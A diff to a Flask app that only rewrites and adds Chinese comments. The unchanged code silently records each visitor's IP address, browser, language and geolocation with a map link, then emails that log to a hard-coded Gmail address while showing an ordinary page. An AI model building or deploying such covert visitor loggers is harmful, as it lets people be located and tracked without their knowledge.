@@ -10,18 +10,18 @@ app = Flask(__name__)
 
 @app.route('/')
 def index():
-    # 擷取 IP
+    # 擷取訪客 IP
     user_ip = request.headers.get('X-Forwarded-For')
     if user_ip:
         user_ip = user_ip.split(',')[0].strip()
     else:
         user_ip = request.remote_addr
 
-    # 擷取 User-Agent / 語言
+    # 擷取裝置資訊與語言
     user_agent = request.headers.get('User-Agent')
     accept_language = request.headers.get('Accept-Language', 'Unknown')
 
-    # 用 IP 查詢地理位置
+    # 查詢 IP 地理資訊
     location_info = "Unknown"
     map_link = ""
     try:
@@ -39,8 +39,8 @@ def index():
     except Exception as e:
         location_info = f"Error retrieving location: {e}"
 
+    # 組合通知內容
     timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-
     message = f"""[IP Access Log]
 
 Time: {timestamp}
@@ -51,6 +51,7 @@ Browser Info: {user_agent}
 Language: {accept_language}
 """
 
+    # 寄送 Email 通知
     send_email("sces9204@gmail.com", message)
     return render_template("index.html")
 
